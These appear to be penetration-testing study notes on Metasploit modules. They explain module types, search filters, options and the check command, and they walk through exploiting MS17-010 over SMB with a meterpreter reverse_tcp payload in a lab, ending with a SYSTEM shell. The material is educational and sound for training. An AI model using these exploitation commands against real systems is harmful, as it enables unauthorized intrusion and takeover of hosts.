# 💥 Metasploit Modules

> [!info]+ 🎯 What Are Metasploit Modules?  
> **Metasploit modules** are pre-built pieces of code designed for specific penetration-testing tasks.
> 
> They automate common activities such as:
> 
> ```text
> 🔎 Scanning
> 🧪 Vulnerability checking
> 💥 Exploitation
> 🐚 Payload delivery
> 🔐 Post-exploitation
> ```
> 
> The important idea is:
> 
> > **Metasploit automates techniques that would otherwise require manual work.**
> 
> However, a failed Metasploit exploit **does not prove that the vulnerability does not exist**.
> 
> ```text
> Metasploit exploit fails
>          │
>          ▼
>      ❓ Why?
>          │
>     ┌────┴────┐
>     ▼         ▼
> Wrong       Target
> module      requires
>             customization
> ```
> 
> Metasploit should therefore be treated as a **support tool**, not a replacement for manual enumeration and exploitation skills.

---

# 🧩 1️⃣ Metasploit Module Structure

Metasploit modules are organized into a predictable structure:

```text
<type>/<os>/<service>/<name>
```

Example:

```text
exploit/windows/ftp/scriptftp_list
```

Think of the path as:

```text
TYPE
 │
 └── What kind of module?
        │
        ▼
OS
 │
 └── What operating system/platform?
        │
        ▼
SERVICE
 │
 └── What service/functionality?
        │
        ▼
NAME
 │
 └── What does the module do?
```

---

# 🔢 2️⃣ Module Index Number

When searching inside `msfconsole`, Metasploit displays a number beside each result.

Example:

```text
   #  Name
   -  ----
   0  exploit/windows/smb/ms17_010_eternalblue
   1  exploit/windows/smb/ms17_010_psexec
   2  auxiliary/admin/smb/ms17_010_command
   3  auxiliary/scanner/smb/smb_ms17_010
```

The number can be used to select the module:

```bash
use 1
```

Instead of typing:

```bash
use exploit/windows/smb/ms17_010_psexec
```

> [!tip]+ 🧠 Remember  
> **Search → Identify → Use the index number**
> 
> ```text
> search <keyword>
>       ↓
> Find module
>       ↓
> use <number>
> ```

---

# 🗂️ 3️⃣ Metasploit Module Types

Metasploit contains several different module categories.

|Type|Purpose|
|---|---|
|🔧 `auxiliary`|Scanning, enumeration, fuzzing, administration and other supporting tasks|
|💥 `exploit`|Exploits a vulnerability to achieve code execution or another attacker-controlled result|
|📦 `payload`|Code executed on the target after exploitation|
|🔀 `encoder`|Encodes payloads for specific technical requirements|
|💤 `nop`|No-operation instructions used primarily for payload/exploit size or execution consistency|
|🔌 `plugin`|Extends Metasploit's functionality|
|🧹 `post`|Post-exploitation activities such as gathering information or facilitating further access|

### ⭐ The Three Important Interactive Module Types

The module types you will most commonly **select and interact with directly** are:

```text
🔧 Auxiliary
💥 Exploit
🧹 Post
```

For example:

```bash
use 0
```

can select an exploit, auxiliary module, or post module from search results.

---

# 💥 4️⃣ Exploit Modules

An **exploit module** attempts to take advantage of a known vulnerability.

Conceptually:

```text
Vulnerability
      │
      ▼
💥 Exploit Module
      │
      ▼
Target compromise
      │
      ▼
📦 Payload
      │
      ▼
🐚 Session
```

Example:

```text
exploit/windows/smb/ms17_010_eternalblue
```

The exploit module is responsible for exploiting the vulnerability.

The **payload** determines what happens after successful exploitation.

> [!important]+ 🧠 Exploit ≠ Payload
> 
> ```text
> 💥 Exploit
>     ↓
> "How do I exploit the vulnerability?"
> 
> 📦 Payload
>     ↓
> "What should execute after exploitation?"
> ```
> 
> Keeping these two concepts separate is extremely important when working with Metasploit.

---

# 🔧 5️⃣ Auxiliary Modules

`auxiliary` modules perform supporting tasks.

Examples include:

```text
🔎 Scanning
🔍 Enumeration
🧪 Vulnerability checking
📡 Service interaction
🔐 Credential-related functions
```

For example:

```text
auxiliary/scanner/smb/smb_ms17_010
```

can be used to determine whether a target appears vulnerable to MS17-010.

Notice that it is **not an exploit module**.

```text
🔧 Auxiliary
     │
     └── Check / gather information

💥 Exploit
     │
     └── Attempt exploitation
```

---

# 🧹 6️⃣ Post Modules

`post` modules are generally used **after gaining access**.

They can help with:

```text
🔎 Information gathering
🔐 Credential discovery
🖥️ Host enumeration
↔️ Pivoting
📊 Session-related post-exploitation
```

Think of the overall lifecycle:

```text
🔎 Enumeration
      ↓
💥 Exploitation
      ↓
🐚 Session
      ↓
🧹 Post-Exploitation
```

---

# 🔎 7️⃣ Searching for Modules

One of the most important Metasploit skills is being able to **search effectively**.

Basic syntax:

```bash
search <keyword>
```

Example:

```bash
search eternalromance
```

Metasploit may return:

```text
#  Name
-  ----
0  exploit/windows/smb/ms17_010_psexec
1  auxiliary/admin/smb/ms17_010_command
```

You can narrow the results by specifying a module type:

```bash
search eternalromance type:exploit
```

Now only exploit modules matching the search are returned.

---

# 🧠 8️⃣ Metasploit Search Keywords

Metasploit supports many search filters.

Useful ones include:

|Keyword|Meaning|
|---|---|
|`cve:`|Search by CVE|
|`type:`|Search by module type|
|`platform:`|Search by platform|
|`arch:`|Search by architecture|
|`name:`|Search module name|
|`description:`|Search description|
|`author:`|Search by module author|
|`port:`|Search modules associated with a port|
|`rank:`|Filter by exploit rank|
|`check:`|Find modules supporting a `check` method|
|`path:`|Search by module path|
|`target:`|Search by target type|

Example:

```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

This combines multiple conditions.

```text
type:exploit
      +
platform:windows
      +
cve:2021
      +
rank:excellent
      +
microsoft
      ↓
More focused results
```

> [!tip]+ 🧠 Search Strategy  
> Don't blindly search for a random exploit name.
> 
> Start with what you **actually know about the target**:
> 
> ```text
> Service
>    ↓
> Version
>    ↓
> OS
>    ↓
> Vulnerability / CVE
>    ↓
> Metasploit search
> ```

---

# 🕵️ 9️⃣ Example: SMB → MS17-010

Suppose Nmap identifies:

```text
445/tcp open microsoft-ds
```

and the target appears to be:

```text
Windows 7
```

We suspect MS17-010.

Instead of immediately running an exploit, search:

```bash
search ms17_010
```

Possible results:

```text
0  exploit/windows/smb/ms17_010_eternalblue
1  exploit/windows/smb/ms17_010_psexec
2  auxiliary/admin/smb/ms17_010_command
3  auxiliary/scanner/smb/smb_ms17_010
```

Now we need to understand what each module does.

```text
#0 💥 EternalBlue exploit
#1 💥 EternalRomance/PsExec exploit
#2 🔧 Command execution auxiliary module
#3 🔎 Vulnerability scanner
```

> [!important]+ 🧠 Don't Pick Based Only on the Name  
> Multiple modules may target the **same vulnerability** but use different techniques.
> 
> Always inspect the module before using it.

---

# 📋 🔟 Selecting a Module

Use the module's index:

```bash
use 1
```

Your prompt changes to something similar to:

```text
msf6 exploit(windows/smb/ms17_010_psexec) >
```

This tells you which module is currently active.

You can then inspect its configuration:

```bash
show options
```

---

# ⚙️ 1️⃣1️⃣ Understanding `show options`

`show options` displays the settings required by the module.

Example:

```text
Name       Current Setting    Required
----       ---------------    --------
RHOSTS                        yes
RPORT      445                yes
LHOST                         yes
LPORT      4444               yes
```

The most important column is:

```text
Required
```

If it says:

```text
yes
```

you generally need to provide a value before the module can work correctly.

---

# 🎯 1️⃣2️⃣ RHOSTS vs LHOST

This is one of the most important concepts to understand.

### 🎯 `RHOSTS`

**RHOSTS = Remote Hosts**

This identifies the target.

```text
RHOSTS
   │
   ▼
🎯 Target machine
```

Example:

```bash
set RHOSTS 10.10.10.40
```

---

### 🖥️ `LHOST`

**LHOST = Local Host**

This identifies the attacker's listening address for a reverse connection.

```text
Target
   │
   │ reverse connection
   ▼
LHOST
🖥️ Attack Box
```

Example:

```bash
set LHOST 10.10.14.15
```

---

### 🧠 Easy Mental Model

```text
R = Remote
L = Local

RHOSTS → 🎯 Where am I attacking?
LHOST  → 🖥️ Where should the callback come?
```

> [!warning]+ ⚠️ Common Beginner Mistake  
> Don't confuse these:
> 
> ```text
> RHOSTS = Target
> LHOST  = Your machine / listener address
> ```

---

# 🔌 1️⃣3️⃣ RPORT

`RPORT` specifies the target service port.

For SMB:

```text
RPORT = 445
```

Example:

```bash
set RPORT 445
```

Conceptually:

```text
Attack Box
    │
    │
    ▼
10.10.10.40:445
             │
             └── SMB
```

---

# 📦 1️⃣4️⃣ Payload Options

A Metasploit exploit can use a payload.

Example:

```text
windows/meterpreter/reverse_tcp
```

Break it down:

```text
windows
   │
   └── Target platform

meterpreter
   │
   └── Payload/session type

reverse_tcp
   │
   └── Connection method
```

The reverse TCP payload needs:

```text
LHOST
LPORT
```

Example:

```bash
set LHOST 10.10.14.15
set LPORT 4444
```

The resulting connection conceptually looks like:

```text
🎯 Target
10.10.10.40
     │
     │ TCP reverse connection
     ▼
🖥️ Attack Box
10.10.14.15:4444
```

---

# 🔄 1️⃣5️⃣ `set` vs `setg`

Metasploit provides two useful commands.

### `set`

Sets an option for the **current module**.

```bash
set RHOSTS 10.10.10.40
```

Think:

```text
set
 ↓
Current module
```

---

### `setg`

Sets a **global value** that can be reused across modules during the current Metasploit session.

```bash
setg RHOSTS 10.10.10.40
```

Think:

```text
setg
 ↓
Global Metasploit setting
 ↓
Reusable by other modules
```

> [!tip]+ 🧠 When Is `setg` Useful?  
> If you're working against the same target across multiple modules, setting common values globally can save time.
> 
> ```bash
> setg RHOSTS 10.10.10.40
> setg LHOST 10.10.14.15
> ```

---

# 🔬 1️⃣6️⃣ `info` — Understand the Module

Before executing a module, use:

```bash
info
```

This provides important information such as:

```text
📌 Module name
💻 Platform
🏗️ Architecture
⭐ Rank
📅 Disclosure date
🎯 Available targets
🧪 Check support
📖 Description
🔗 References
```

Example:

```text
Name: MS17-010 ...
Module: exploit/windows/smb/ms17_010_psexec
Platform: Windows
Arch: x86, x64
Rank: Normal
Check supported: Yes
```

> [!important]+ 🧠 Why `info` Matters  
> `info` helps answer:
> 
> ```text
> ❓ What does this module actually do?
> ❓ What platform does it target?
> ❓ Does it support my architecture?
> ❓ Does it have a check function?
> ❓ What targets does it support?
> ❓ What references/CVEs are associated with it?
> ```
> 
> **Don't blindly run modules you haven't inspected.**

---

# ⭐ 1️⃣7️⃣ Exploit Rank

Metasploit assigns exploit modules a rank indicating their expected reliability.

You may encounter ranks such as:

```text
Excellent
Great
Good
Normal
Average
Low
Manual
```

Higher rank generally means the framework considers the exploit more reliable.

However:

> [!warning]+ ⚠️ Rank ≠ Guarantee  
> A module having a high rank does **not** mean it will definitely work against your target.
> 
> Target configuration, OS version, patches, architecture, network conditions, and module requirements can all affect success.

---

# 🧪 1️⃣8️⃣ The `check` Method

Some modules support:

```bash
check
```

This attempts to determine whether the target appears vulnerable **without necessarily executing the full exploit**.

You can identify whether a module supports checking through:

```text
Check: Yes
```

or the `Check` column in search results.

Conceptually:

```text
🎯 Target
    │
    ▼
🧪 check
    │
    ├── Likely vulnerable
    │
    └── Not vulnerable / unknown
```

> [!tip]+ 🧠 Good Habit  
> If a module supports `check`, consider using it before exploitation during an authorized assessment.

---

# 🚀 1️⃣9️⃣ Executing the Module

Once the required options are configured:

```bash
run
```

or, for exploit modules:

```bash
exploit
```

Metasploit then performs the module's workflow.

Conceptually:

```text
🔎 Search
   ↓
🎯 Select module
   ↓
📋 show options
   ↓
⚙️ Configure
   ↓
🧪 check (if available)
   ↓
💥 exploit / run
   ↓
🐚 Session
```

---

# 🐚 2️⃣0️⃣ Understanding the Resulting Session

If exploitation succeeds, Metasploit may open a session.

For example:

```text
Command shell session 1 opened
```

You may then interact with the session.

If a Meterpreter session is available:

```text
meterpreter>
```

you can potentially enter a normal command shell:

```bash
shell
```

which may produce:

```text
C:\Windows\system32>
```

Now you can interact with the Windows operating system.

---

# 👤 2️⃣1️⃣ Verify Your Access

Never assume exploitation succeeded just because Metasploit reports a session.

Verify your privileges.

For Windows:

```cmd
whoami
```

Example:

```text
nt authority\system
```

This tells us the session is running as:

```text
NT AUTHORITY\SYSTEM
```

which is a highly privileged Windows security context.

> [!important]+ 🧠 Always Verify
> 
> ```text
> Exploit says SUCCESS
>        ↓
> Don't assume
>        ↓
> Verify session
>        ↓
> Verify user
>        ↓
> Verify privileges
>        ↓
> Continue enumeration
> ```

---

# 🧠 2️⃣2️⃣ The Most Important Metasploit Methodology

When you discover a service and think Metasploit might have a module for it, follow this workflow:

```text
                 🔎 ENUMERATION
                       │
                       ▼
                Identify service
                       │
                       ▼
                 Identify version
                       │
                       ▼
                Identify OS/platform
                       │
                       ▼
               Identify vulnerability
                       │
                       ▼
                🔍 Search Metasploit
                       │
                       ▼
              ┌─────────────────┐
              │ Multiple modules│
              │     found?      │
              └────────┬────────┘
                       │
                       ▼
                 Read `info`
                       │
                       ▼
              Choose appropriate
                   module
                       │
                       ▼
                `show options`
                       │
                       ▼
               Configure values
                       │
                       ├── RHOSTS
                       ├── RPORT
                       ├── LHOST
                       └── LPORT
                       │
                       ▼
                 `check` if able
                       │
                       ▼
                  `run/exploit`
                       │
                       ▼
                  🐚 SESSION
                       │
                       ▼
                Verify access
                       │
                       ▼
              🧹 Post-exploitation
```

---

# 🧩 2️⃣3️⃣ How to Handle Many Metasploit Results

When searching something like:

```bash
search smb
```

you may get **hundreds of modules**.

Don't randomly pick one.

Use a narrowing strategy:

```text
❌ Bad approach

search smb
      ↓
Hundreds of results
      ↓
Pick something that sounds good
```

Instead:

```text
✅ Better approach

Nmap
  ↓
Identify service
  ↓
Identify version
  ↓
Identify OS
  ↓
Search specific vulnerability/CVE
  ↓
Filter by type/platform
  ↓
Read `info`
  ↓
Select appropriate module
```

For example:

```bash
search ms17_010
```

is much more useful than:

```bash
search smb
```

if your enumeration has already identified MS17-010.

> [!success]+ 🎯 CPTS Mindset  
> **Enumeration should drive Metasploit selection.**
> 
> Metasploit should not replace enumeration.

---

# 🧠 2️⃣4️⃣ Failure Does Not Mean "Not Vulnerable"

This is one of the most important concepts from the module.

Suppose:

```text
Target appears vulnerable
        │
        ▼
Metasploit exploit
        │
        ▼
       FAIL
```

Do **not** immediately conclude:

```text
❌ Vulnerability doesn't exist
```

Instead:

```text
Exploit failed
     │
     ▼
Investigate
     │
     ├── Correct module?
     ├── Correct target?
     ├── Correct architecture?
     ├── Correct options?
     ├── Correct payload?
     ├── Network connectivity?
     ├── Target configuration?
     └── Does the exploit require customization?
```

> [!warning]+ ⚠️ Critical Concept  
> **"The Metasploit module failed" ≠ "The target is not vulnerable."**
> 
> Automated exploitation can fail for many reasons.

---

# 🧠 2️⃣5️⃣ Metasploit as a Support Tool

The larger lesson is not:

> "Learn every Metasploit command."

Instead:

> **Learn how to reason about the target, then use Metasploit to accelerate the work.**

Think:

```text
                 👨‍💻 PENTESTER
                      │
          ┌───────────┴───────────┐
          ▼                       ▼
   🧠 Manual Skills         🤖 Metasploit
          │                       │
          │                       │
          └──────────┬────────────┘
                     ▼
                Better Results
```

Metasploit is powerful, but the operator still needs to understand:

```text
🌐 Networking
🖥️ Operating systems
🔎 Enumeration
🧩 Vulnerabilities
📦 Payloads
🐚 Shells
🔐 Privileges
```

---

# 📋 2️⃣6️⃣ Quick Reference

## 🔍 Search

```bash
search <keyword>
```

Example:

```bash
search ms17_010
```

---

## 🎯 Select Module

```bash
use <number>
```

Example:

```bash
use 1
```

---

## 📖 Module Information

```bash
info
```

---

## ⚙️ Show Configuration

```bash
show options
```

---

## 🎯 Set Target

```bash
set RHOSTS <TARGET_IP>
```

---

## 🔌 Set Target Port

```bash
set RPORT <PORT>
```

---

## 🖥️ Set Callback Address

```bash
set LHOST <YOUR_IP>
```

---

## 🔢 Set Callback Port

```bash
set LPORT <PORT>
```

---

## 🌎 Global Setting

```bash
setg RHOSTS <TARGET_IP>
```

---

## 🧪 Check Vulnerability

```bash
check
```

_Only when supported by the module._

---

## 🚀 Execute

```bash
run
```

or:

```bash
exploit
```

---

# 🧠 2️⃣7️⃣ Core Concepts to Memorize

|Concept|Meaning|
|---|---|
|💥 `exploit`|Attempts to exploit a vulnerability|
|🔧 `auxiliary`|Supporting functions such as scanning/enumeration|
|📦 `payload`|Code executed after exploitation|
|🧹 `post`|Post-exploitation functionality|
|🔢 Module number|Shortcut for selecting a search result|
|🎯 `RHOSTS`|Target host(s)|
|🔌 `RPORT`|Target service port|
|🖥️ `LHOST`|Local/attacker callback address|
|🔢 `LPORT`|Local listening port|
|⚙️ `set`|Set option for current module|
|🌎 `setg`|Set global option|
|📋 `show options`|Display module configuration|
|📖 `info`|Display detailed module information|
|🧪 `check`|Test whether the target appears vulnerable|
|🚀 `run/exploit`|Execute the module|

---

# 🎯 2️⃣8️⃣ CPTS Mental Model

> [!success]+ 🧠 Metasploit Workflow
> 
> ```text
> 🔎 ENUMERATE
>       │
>       ▼
> 🌐 Identify Service
>       │
>       ▼
> 🏷️ Identify Version / OS
>       │
>       ▼
> 🧩 Identify Vulnerability
>       │
>       ▼
> 🔍 Search Metasploit
>       │
>       ▼
> 🎯 Select Candidate Module
>       │
>       ▼
> 📖 `info`
>       │
>       ▼
> 📋 `show options`
>       │
>       ▼
> ⚙️ Configure
>       │
>       ├── RHOSTS
>       ├── RPORT
>       ├── LHOST
>       └── LPORT
>       │
>       ▼
> 🧪 `check`
>       │
>       ▼
> 💥 `run` / `exploit`
>       │
>       ▼
> 🐚 Obtain Session
>       │
>       ▼
> 👤 Verify User / Privileges
>       │
>       ▼
> 🧹 Post-Exploitation
> ```
> 
> ### ⭐ The Golden Rule
> 
> ```text
> ENUMERATION
>      ↓
> UNDERSTANDING
>      ↓
> SEARCH
>      ↓
> SELECT
>      ↓
> CONFIGURE
>      ↓
> CHECK
>      ↓
> EXPLOIT
>      ↓
> VERIFY
> ```
> 
> **Don't let Metasploit tell you what to attack. Your enumeration should tell you what to attack; Metasploit should help you execute the appropriate technique.**